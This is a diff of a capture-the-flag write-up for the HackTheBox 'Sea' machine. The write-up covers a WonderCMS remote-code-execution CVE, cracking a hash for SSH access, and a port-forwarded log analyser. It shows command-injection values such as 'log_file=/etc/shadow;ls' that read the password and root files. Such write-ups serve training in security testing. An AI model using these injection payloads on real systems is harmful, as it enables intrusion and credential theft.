@@ -1,10 +1,11 @@
 ---
-title: "HTB: SEA Seasonal Machine"
+title: "HTB Seasonal: SEA"
 author: "v3l1d"
 date: "2024-08-08"
 ---
 
 ![](attachment/c4cc9c4aee6aa0e906e23da81acfe73a.jpg)
+
 **Nmap**
 
 ```shell
@@ -86,11 +87,12 @@ README.md                        100%[==========================================
 
 ```
 
-WGET README.md and LICENSE and analyze content, it says is used WonderCMS
+Get README.md and LICENSE and analyze content, it says is used WonderCMS
 
 ![](attachment/72b505acf6cc17aeff4fafb3135dacfb.png)
 
 Looking online found: [CVE-2023-41425 (WonderCMS Remote Code Execution) - PoC](https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413)
+
 ![](attachment/bafc9212737fc47089cd6101baff47f0.png)
 
 	Clone the repo and try. After talking with others on discord
@@ -138,7 +140,7 @@ $ cat database.js
 ```
 
 
-Fix the hash provided removing the escapes obtaining this:
+Fix retrieved hash's format and run hashcat:
 
 ```shell
 $2y$10$iOrk****************
@@ -172,7 +174,7 @@ Stopped: Wed Aug 14 06:22:41 2024
 
 ![](attachment/4b8223e56cbf8a23659153d34599548d.png)
 
-Try this password in ssh with one of these two users:
+Try this password in ssh with one of the users listed in /home:
 
 ```shell
 ┌──(kali㉿kali)-[~/HTB/Sea]
@@ -192,7 +194,8 @@ geo
 ```
 
 ![](attachment/5e7f51c554cca528be1ef76f440f477d.png)
-Manipulate burp request on http://localhost:8888 after forwarding this port trough ssh from 8080 of the victim 
+
+Manipulate the request on http://localhost:8888 with BurpSuite, after forwarding this port trough ssh from 8080 of the victim 
 
 ```shell
 log_file=/etc/shadow;ls&analyze_log=/etc/shadow
@@ -207,7 +210,6 @@ We can get the root flag directly
 log_file=/root/root.txt;ls&analyze_log=/root/root.txt
 ```
 
-**Flags
 ```shell
 user:459138e5dbf2****************
 root:c58fac105938****************
